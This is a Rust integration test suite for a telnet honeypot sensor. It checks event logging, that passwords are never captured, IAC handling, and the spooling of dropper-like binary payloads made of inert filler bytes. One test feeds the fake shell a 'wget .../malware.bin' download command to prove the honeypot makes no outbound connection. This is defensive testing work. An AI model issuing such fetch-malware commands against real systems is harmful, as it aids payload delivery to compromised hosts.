//! Real-client integration tests: connects a plain `tokio::net::TcpStream` to this crate's own
//! honeypot and verifies events, protocol_label, and the password-never-captured invariant end to
//! end. Telnet has no cryptography or handshake beyond IAC negotiation, so a raw TCP client (as
//! the task brief specifies) is a faithful enough stand-in for a real telnet client.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use sensor_framework::{ConnectionBounds, WanResolver};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

fn test_bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(5),
        idle_timeout: Duration::from_secs(5),
        max_duration: Duration::from_secs(30),
        max_captured_bytes: 1_000_000,
        max_concurrent: 100,
    }
}

/// Read from `stream` until the accumulated bytes contain `needle`, or panic after 3s. Telnet
/// negotiation/prompt bytes can arrive split across multiple TCP segments, so this cannot assume
/// one `read` call is enough.
async fn read_until_contains(stream: &mut TcpStream, needle: &[u8]) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 1024];
    let result = tokio::time::timeout(Duration::from_secs(3), async {
        loop {
            let n = stream.read(&mut chunk).await.expect("read failed");
            assert!(n > 0, "connection closed before {needle:?} was seen");
            buf.extend_from_slice(&chunk[..n]);
            if buf.windows(needle.len()).any(|w| w == needle) {
                return;
            }
        }
    })
    .await;
    result.unwrap_or_else(|_| panic!("timed out waiting for {needle:?}, got {buf:?}"));
    buf
}

async fn login(conn: &mut TcpStream, username: &[u8], password: &[u8]) {
    read_until_contains(conn, b"login: ").await;
    conn.write_all(username).await.unwrap();
    conn.write_all(b"\r\n").await.unwrap();
    read_until_contains(conn, b"Password: ").await;
    conn.write_all(password).await.unwrap();
    conn.write_all(b"\r\n").await.unwrap();
    read_until_contains(conn, b"# ").await;
}

// -------------------------------------------------------------------------------------------
// given suite (task brief)
// -------------------------------------------------------------------------------------------

#[tokio::test]
async fn login_and_command_capture_emits_expected_events() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"attacker", b"hunter2").await;
    conn.write_all(b"uname -a\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    conn.write_all(b"exit\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event; got: {signal_types:?}"
    );

    let cmd_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC)
        .unwrap();
    assert_eq!(
        cmd_event.metadata.get("command").and_then(|v| v.as_str()),
        Some("uname -a")
    );
}

#[tokio::test]
async fn password_never_appears_in_any_event() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"SuperSecretPassword123").await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        !content.contains("SuperSecretPassword123"),
        "password must never appear in any event"
    );
}

#[tokio::test]
async fn protocol_label_is_telnet_on_all_events() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;
    conn.write_all(b"whoami\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    assert!(!events.is_empty());
    for event in &events {
        assert_eq!(event.sensor, "telnet");
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
        let label = event
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str());
        assert_eq!(label, Some("telnet"), "protocol_label must be 'telnet'");
    }
}

#[test]
fn never_exec_static_check() {
    // Mirrors sensor-ssh's tests/shell_test.rs::never_exec_static_check, scoped to
    // sensor-telnet's own source. sensor-framework (where FakeFs/FakeShell actually live, the two
    // highest-priority security surfaces per shell.rs's own module doc) is already covered by
    // sensor-ssh's copy of this same check, so it is deliberately not re-scanned here.
    let src_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let files = walkdir_or_manual(&src_dir);
    assert!(
        !files.is_empty(),
        "expected to find sensor-telnet source files at {}",
        src_dir.display()
    );

    let mut found_exec = Vec::new();
    for entry in &files {
        let content = std::fs::read_to_string(entry).unwrap_or_default();
        if content.contains("std::process::Command")
            || content.contains("process::Command")
            || content.contains("Command::new")
            || content.contains("libc::exec")
            || content.contains("nix::unistd::exec")
        {
            found_exec.push(entry.display().to_string());
        }
    }
    assert!(
        found_exec.is_empty(),
        "sensor-telnet must not contain process-spawning code: {found_exec:?}"
    );
}

#[tokio::test]
async fn malformed_random_bytes_drop_connection_without_crashing_listener() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // A pseudo-random byte stream, heavy on 0xFF (IAC) to specifically stress the negotiation
    // parser, written then immediately dropped - repeated several times with different seeds.
    for seed in 0..5u8 {
        if let Ok(mut conn) = TcpStream::connect(addr).await {
            let garbage: Vec<u8> = (0..2048u32)
                .map(|i| (i as u8).wrapping_mul(31).wrapping_add(seed))
                .collect();
            let _ = conn.write_all(&garbage).await;
            drop(conn);
        }
    }
    tokio::time::sleep(Duration::from_millis(200)).await;

    // The listener must still be accepting new connections.
    let conn = TcpStream::connect(addr).await;
    assert!(conn.is_ok(), "accept loop must survive malformed input");
    handle.abort();
}

// -------------------------------------------------------------------------------------------
// additional coverage, not in the brief's given suite.
//
// None of the five tests above can distinguish this implementation from one that (a) hardcodes
// `authenticated`/`source_ip`/`wan_ip` rather than reading real connection state, (b) accepts only
// specific credentials instead of all of them, (c) leaks a stray IAC byte into the captured
// username when a client sends option negotiation mid-line, or (d) lets the shared FakeShell's
// outbound-fetch simulation actually dial out. Mirrors sensor-ssh's own rationale for the same
// reason: the given fixtures are necessary, not sufficient.
// -------------------------------------------------------------------------------------------

#[tokio::test]
async fn connection_event_unauthenticated_login_event_authenticated_with_username() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let conn_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION)
        .unwrap();
    assert!(!conn_event.authenticated);

    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert!(login_event.authenticated);
    assert_eq!(
        login_event
            .metadata
            .get("username")
            .and_then(|v| v.as_str()),
        Some("root")
    );
}

#[tokio::test]
async fn accepts_all_credentials() {
    // The design spec's "Accept all credentials, emit honeypot_login_attempt
    // (authenticated=true)" - any username/password combination succeeds; there is no real
    // authentication check. Reaching the shell prompt at all proves the login was accepted.
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(
        &mut conn,
        b"totally-made-up-user",
        b"totally-made-up-password",
    )
    .await;
    handle.abort();
}

#[tokio::test]
async fn iac_bytes_in_username_do_not_corrupt_the_line_buffer() {
    // "Don't crash on IAC sequences embedded in data" - an IAC negotiation sequence arriving
    // mid-line must be stripped without leaving stray bytes in the captured username.
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    read_until_contains(&mut conn, b"login: ").await;
    // "ro" + IAC WILL <terminal-type opt 24> (a client spontaneously offering an option mid-line,
    // which real telnet clients do) + "ot" + CRLF.
    let mut line = b"ro".to_vec();
    line.extend_from_slice(&[255, 251, 24]);
    line.extend_from_slice(b"ot\r\n");
    conn.write_all(&line).await.unwrap();
    read_until_contains(&mut conn, b"Password: ").await;
    conn.write_all(b"pass\r\n").await.unwrap();
    read_until_contains(&mut conn, b"# ").await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert_eq!(
        login_event
            .metadata
            .get("username")
            .and_then(|v| v.as_str()),
        Some("root"),
        "IAC bytes embedded mid-line must be stripped, not leak into the captured username"
    );
}

#[tokio::test]
async fn multiple_commands_each_captured_as_separate_events() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;
    conn.write_all(b"whoami\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;
    conn.write_all(b"id\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;
    conn.write_all(b"pwd\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let commands: Vec<&str> = events
        .iter()
        .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC)
        .filter_map(|e| e.metadata.get("command").and_then(|v| v.as_str()))
        .collect();
    assert_eq!(commands, vec!["whoami", "id", "pwd"]);
}

#[tokio::test]
async fn no_outbound_connections_from_wget_in_shell() {
    // Mirrors sensor-ssh's own `no_outbound_connections` test: the shared FakeShell's wget/curl
    // handlers must perform zero real network I/O regardless of which sensor drives them.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;
    let cmd = format!(
        "wget http://127.0.0.1:{}/malware.bin\r\n",
        target_addr.port()
    );
    conn.write_all(cmd.as_bytes()).await.unwrap();
    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(conn);
    handle.abort();
    target_task.abort();

    assert_eq!(
        connection_count.load(std::sync::atomic::Ordering::Relaxed),
        0,
        "sensor-telnet must open ZERO outbound connections"
    );
}

// -------------------------------------------------------------------------------------------
// evidence capture: raw shell-phase input is spooled when the shared FakeShell flags a binary
// payload (a Mirai/Gafgyt dropper today collapses to a "flood": "binary" marker with the raw
// bytes discarded); a plaintext-only session, and the login/password phase of every session,
// must never be captured.
// -------------------------------------------------------------------------------------------

/// A dropper streaming its payload with no newline yet, cut off when the listener hits
/// `max_duration`. Nothing in this test tells the sensor the bytes are binary: no line is ever
/// completed, so the per-line flood flag is never raised, and the session is ended by the
/// listener rather than by the client. Both of those are the production boundary the unit tests
/// bypass by calling the flag directly, and both were broken - the capture was discarded for
/// want of a flag, and a cancelled capture reported itself complete.
#[tokio::test]
async fn a_payload_cut_off_mid_line_is_still_captured_and_marked_incomplete() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let bounds = ConnectionBounds {
        // Short enough that the listener cancels this session while the payload is still
        // mid-line, which is the path under test.
        max_duration: Duration::from_secs(2),
        ..test_bounds()
    };
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        wan_resolver,
        bounds,
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;

    // Mostly non-ASCII, and deliberately NO trailing newline: the reader buffers it, the shell
    // never sees a line, and the flood flag is never raised.
    let payload = vec![0xAAu8; 256];
    conn.write_all(&payload).await.unwrap();

    // Hold the connection open and let the listener's max_duration cancel the handler.
    wait_for_spooled_file(&spool_dir).await;
    drop(conn);
    handle.abort();

    let spooled: Vec<_> = std::fs::read_dir(&spool_dir).unwrap().collect();
    assert_eq!(spooled.len(), 1, "the cut-off payload must be spooled");
    let stored = std::fs::read(spooled[0].as_ref().unwrap().path()).unwrap();
    assert_eq!(stored, payload, "the stored bytes are what the client sent");

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let upload = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD)
        .expect("a cancelled session's binary capture must still be recorded");
    assert_eq!(
        upload.metadata["capture_reason"], "binary_shell_payload",
        "{:?}",
        upload.metadata
    );
    assert_eq!(
        upload.metadata["complete"], false,
        "a capture handed over by a cancelled handler is a fragment: {:?}",
        upload.metadata
    );
    assert_eq!(upload.metadata["size"], payload.len() as u64);
    assert_eq!(upload.metadata["truncated"], false);
    assert_eq!(
        upload.sample.as_ref().unwrap().size,
        payload.len() as u64,
        "the sample the console reads points at the stored bytes"
    );
}

/// How the client ends the session, which is the only thing that can say whether a shell capture
/// holds the whole payload: the sensor has no protocol-defined end of file to go by.
enum Ending {
    /// Stop sending and let `idle_timeout` elapse with the connection still open.
    GoQuiet,
    /// Close the connection cleanly. The peer finished sending.
    CloseCleanly,
    /// Abort with an RST (`SO_LINGER` 0), so the server's next read fails rather than reporting
    /// end-of-file.
    ResetConnection,
}

/// Drive one binary-payload session to `ending` and return the upload event's metadata with the
/// bytes that reached the spool. Every caller sends a payload that is binary and unterminated -
/// only the ending differs, so a difference in the recorded outcome can come from nothing else.
async fn payload_session(bounds: ConnectionBounds, payload: &[u8], ending: Ending) -> Metadata {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        wan_resolver,
        bounds,
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;
    conn.write_all(payload).await.unwrap();

    match ending {
        Ending::GoQuiet => {
            wait_for_spooled_file(&spool_dir).await;
            drop(conn);
        }
        Ending::CloseCleanly => {
            drop(conn);
            wait_for_spooled_file(&spool_dir).await;
        }
        Ending::ResetConnection => {
            // A zero linger makes close send RST instead of FIN, so the server sees a read error
            // rather than end-of-file. Without it this case is indistinguishable from a clean
            // close, and a clean close is the one ending that means the payload was finished.
            //
            // Deprecated because a NON-zero linger blocks the closing thread until the kernel
            // finishes draining. Zero is the opposite case: close returns at once and sends the
            // reset, which is the whole point here. The alternative is a raw `setsockopt` behind
            // `unsafe`, which buys nothing for a test that wants exactly this behavior.
            #[allow(deprecated)]
            conn.set_linger(Some(Duration::ZERO)).unwrap();
            drop(conn);
            wait_for_spooled_file(&spool_dir).await;
        }
    }
    handle.abort();

    let stored_dir: Vec<_> = std::fs::read_dir(&spool_dir).unwrap().collect();
    assert_eq!(stored_dir.len(), 1, "exactly one capture per session");
    let stored = std::fs::read(stored_dir[0].as_ref().unwrap().path()).unwrap();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let upload = content
        .lines()
        .map(|l| serde_json::from_str::<sensor_wire::SensorEvent>(l).unwrap())
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD)
        .expect("the binary capture must be recorded whatever ended the session");
    Metadata {
        json: upload.metadata,
        stored,
    }
}

struct Metadata {
    json: serde_json::Value,
    stored: Vec<u8>,
}

/// An idle session is not a finished one. The payload stops arriving and the reader's
/// `idle_timeout` elapses with the transfer still open, so the bytes are a fragment - but every
/// one of these endings used to run the same "the loop returned, so it is complete" line.
#[tokio::test]
async fn a_payload_abandoned_mid_transfer_is_recorded_as_cut_short_by_the_idle_timeout() {
    let bounds = ConnectionBounds {
        idle_timeout: Duration::from_millis(600),
        max_duration: Duration::from_secs(30),
        ..test_bounds()
    };
    let payload = vec![0xAAu8; 256];
    let m = payload_session(bounds, &payload, Ending::GoQuiet).await;

    assert_eq!(m.stored, payload, "the stored bytes are what was sent");
    assert_eq!(m.json["end_reason"], "idle_timeout", "{:?}", m.json);
    assert_eq!(
        m.json["complete"], false,
        "an idle timeout cut the transfer short: {:?}",
        m.json
    );
}

/// A socket that fails mid-session is also not a finished one, and an RST is the case a clean
/// close is easiest to confuse it with: both end the loop, one after the peer finished sending
/// and one not.
#[tokio::test]
async fn a_payload_ended_by_a_connection_reset_is_recorded_as_a_transport_failure() {
    let payload = vec![0xAAu8; 256];
    let m = payload_session(test_bounds(), &payload, Ending::ResetConnection).await;

    assert_eq!(m.json["end_reason"], "transport_error", "{:?}", m.json);
    assert_eq!(
        m.json["complete"], false,
        "a reset connection left the transfer open: {:?}",
        m.json
    );
}

/// The other side of the same distinction: the peer closed the connection itself, so whatever it
/// sent is whatever it meant to send. This is the ONLY ending in this file that is complete, and
/// it is what stops the fix above from being "label everything incomplete".
#[tokio::test]
async fn a_payload_the_client_finished_sending_before_closing_is_recorded_as_complete() {
    let payload = vec![0xAAu8; 256];
    let m = payload_session(test_bounds(), &payload, Ending::CloseCleanly).await;

    assert_eq!(m.stored, payload);
    assert_eq!(m.json["end_reason"], "peer_closed", "{:?}", m.json);
    assert_eq!(
        m.json["complete"], true,
        "the peer closed the connection itself: {:?}",
        m.json
    );
}

/// Hitting `max_captured_bytes` stops the sensor reading, so the rest of the payload was never
/// seen: the capture is both a prefix (`truncated`) and unfinished (`complete: false`). The two
/// are different facts - a whole small file is truncated: false, complete: true - and the panel
/// shows them differently.
#[tokio::test]
async fn a_payload_that_exhausts_the_capture_budget_is_recorded_as_a_prefix_and_unfinished() {
    let bounds = ConnectionBounds {
        max_captured_bytes: 512,
        idle_timeout: Duration::from_millis(600),
        ..test_bounds()
    };
    // Comfortably past the budget even after the login phase has spent part of it.
    let payload = vec![0xAAu8; 4096];
    let m = payload_session(bounds, &payload, Ending::GoQuiet).await;

    assert_eq!(m.json["end_reason"], "capture_budget", "{:?}", m.json);
    assert_eq!(
        m.json["complete"], false,
        "the rest of the payload was never read: {:?}",
        m.json
    );
    assert_eq!(
        m.json["truncated"], true,
        "the stored bytes are a prefix: {:?}",
        m.json
    );
    assert!(
        m.stored.len() < payload.len(),
        "stored {} of {} bytes",
        m.stored.len(),
        payload.len()
    );
}

/// Poll `spool_dir` for up to ~1s for at least one entry to appear, rather than a fixed sleep -
/// the capture hand-off's worker runs off the connection's response path (see
/// `sensor_framework::handoff`'s module doc), so there is no synchronous point at which "the
/// worker is done" is directly observable.
async fn wait_for_spooled_file(spool_dir: &std::path::Path) {
    let deadline = std::time::Instant::now() + Duration::from_secs(6);
    loop {
        if std::fs::read_dir(spool_dir)
            .map(|mut it| it.next().is_some())
            .unwrap_or(false)
        {
            return;
        }
        if std::time::Instant::now() > deadline {
            panic!("timed out waiting for a spooled capture in {spool_dir:?}");
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

#[tokio::test]
async fn binary_shell_payload_is_captured_as_evidence() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"pass").await;

    // A Mirai/Gafgyt-style binary dropper streamed over the "shell": mostly non-ASCII bytes,
    // which is_binary_line (shell.rs) flags as a binary flood once its lossy-UTF-8-decoded form
    // is >30% non-printable. Every byte here is >= 0x20 so LineReader::feed buffers it into the
    // line rather than discarding it as an ignored control byte.
    let mut binary = vec![0xAAu8; 128];
    binary.extend_from_slice(b"\r\n");
    conn.write_all(&binary).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    drop(conn);

    wait_for_spooled_file(&spool_dir).await;
    handle.abort();

    let spooled: Vec<_> = std::fs::read_dir(&spool_dir).unwrap().collect();
    assert_eq!(spooled.len(), 1, "exactly one sample should be spooled");

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    let upload = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD)
        .expect("expected a honeypot_malware_upload event for the binary shell payload");
    assert_eq!(upload.sensor, "telnet");
    assert!(upload.authenticated);
    let sample = upload
        .sample
        .as_ref()
        .expect("malware_upload event must carry a sample");
    assert!(
        !sample.sha256.is_empty(),
        "sample must have a non-empty sha256"
    );
    assert!(sample.size > 0, "sample must have a non-zero size");
}

#[tokio::test]
async fn plaintext_session_is_never_captured_and_password_never_reaches_the_spool() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_telnet::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        wan_resolver,
        test_bounds(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut conn = TcpStream::connect(addr).await.unwrap();
    login(&mut conn, b"root", b"SuperSecretPassword123").await;
    conn.write_all(b"whoami\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    conn.write_all(b"exit\r\n").await.unwrap();
    tokio::time::sleep(Duration::from_millis(300)).await;
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    let spooled_count = std::fs::read_dir(&spool_dir)
        .map(|it| it.count())
        .unwrap_or(0);
    assert_eq!(
        spooled_count, 0,
        "a plaintext-only session must never produce a spooled capture"
    );

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        !content.contains("SuperSecretPassword123"),
        "password must never appear anywhere in the event log, spooled capture or otherwise"
    );
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    assert!(
        !events
            .iter()
            .any(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD),
        "no malware_upload event for a plaintext-only session; got: {:?}",
        events.iter().map(|e| &e.signal_type).collect::<Vec<_>>()
    );
}

fn walkdir_or_manual(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    fn walk(dir: &std::path::Path, files: &mut Vec<std::path::PathBuf>) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, files);
                } else if path.extension().is_some_and(|e| e == "rs") {
                    files.push(path);
                }
            }
        }
    }
    walk(dir, &mut files);
    files
}
